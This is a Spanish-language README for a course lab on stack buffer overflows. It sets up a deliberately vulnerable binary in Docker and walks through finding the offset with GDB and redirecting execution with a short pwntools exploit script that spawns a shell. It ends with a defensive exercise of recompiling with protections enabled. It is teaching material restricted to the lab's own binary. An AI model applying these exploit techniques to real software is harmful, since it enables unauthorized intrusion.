# Lab: Explotación de binarios (pwn)

Laboratorio para la **Parte 5 — Explotación de sistemas y binarios** (clases 116–140). Trae
`gcc`, `gdb`, `pwntools` y un binario **deliberadamente vulnerable** compilado con las
protecciones desactivadas, para practicar análisis y explotación de un stack overflow.

> ⚠️ **Solo laboratorio.** El binario es tuyo y corre dentro del contenedor aislado. Estas
> técnicas se practican **exclusivamente** sobre binarios propios o retos autorizados (CTF).

## 🎯 Qué vas a practicar

| Objetivo | Clases |
|---|---|
| Assembly, stack y registros | [116](../../classes/parte-5-explotacion-de-sistemas-y-binarios/116-arquitectura-x86-x64-y-lenguaje-ensamblador/README.md), [117](../../classes/parte-5-explotacion-de-sistemas-y-binarios/117-el-stack-los-registros-y-las-convenciones-de-llamada/README.md) |
| Debugging con GDB | [118](../../classes/parte-5-explotacion-de-sistemas-y-binarios/118-debugging-con-gdb-y-pwndbg/README.md) |
| Buffer overflow (teoría y práctica) | [119](../../classes/parte-5-explotacion-de-sistemas-y-binarios/119-buffer-overflow-en-stack-teoria/README.md), [120](../../classes/parte-5-explotacion-de-sistemas-y-binarios/120-buffer-overflow-en-stack-explotacion-practica/README.md) |
| Protecciones modernas (ASLR/NX/canary/PIE) | [122](../../classes/parte-5-explotacion-de-sistemas-y-binarios/122-protecciones-modernas-aslr-dep-nx-stack-canaries-y-pie/README.md) |

## 🚀 Levantar el laboratorio

```bash
cd labs/pwn-binarios
docker compose up -d
docker compose exec pwn bash
# dentro: el binario ya está compilado como ./reto1_overflow
```

## 🧭 Recorrido guiado (dentro del contenedor)

El reto: la función `secreto()` **nunca se llama**; el objetivo es desbordar el búfer de
`vulnerable()` y desviar la dirección de retorno hacia `secreto()`.

```bash
# 1. Reconocimiento del binario
file reto1_overflow
checksec --file=reto1_overflow    # (pwntools) confirma NX off, sin canary, sin PIE

# 2. Encontrar el offset hasta la dirección de retorno con GDB
gdb ./reto1_overflow
#   (gdb) run  → introduce muchas 'A' y observa el crash / EIP
#   usa un patrón cíclico (cyclic 200) de pwntools para medir el offset exacto

# 3. Dirección de secreto()
nm reto1_overflow | grep secreto     # o en gdb: p secreto

# 4. Construir el exploit con pwntools (idea):
python3 - <<'PY'
from pwn import *
e = ELF('./reto1_overflow')
off = 76   # <- mide el offset real con cyclic() en tu binario
payload = b'A'*off + p32(e.symbols['secreto'])
p = process('./reto1_overflow')
p.sendline(payload)
p.interactive()   # deberías obtener una shell
PY
```

## 🏆 Retos verificables

1. **Offset:** determina el offset exacto hasta la dirección de retorno con un patrón cíclico. *Aceptación:* justificas el número con la salida de GDB.
2. **Control de EIP:** demuestra que controlas EIP/RIP (crash en una dirección que tú eliges).
3. **Redirección:** consigue ejecutar `secreto()` y obtener una shell. *Aceptación:* aparece el mensaje `[+] ... Reto resuelto`.
4. **Defensa:** recompila con las protecciones activadas (`-fstack-protector-all`, `-fPIE -pie`, `-z noexecstack`) y explica por qué el exploit deja de funcionar (clase 122).

## 🧯 Apagar

```bash
docker compose down
```

## 🔗 Referencias

- Erickson — *Hacking: The Art of Exploitation* · Andriesse — *Practical Binary Analysis*.
- [pwntools](https://docs.pwntools.com/) · [pwndbg](https://github.com/pwndbg/pwndbg)
- Parte 5 del programa — [índice de clases](../../classes/README.md)
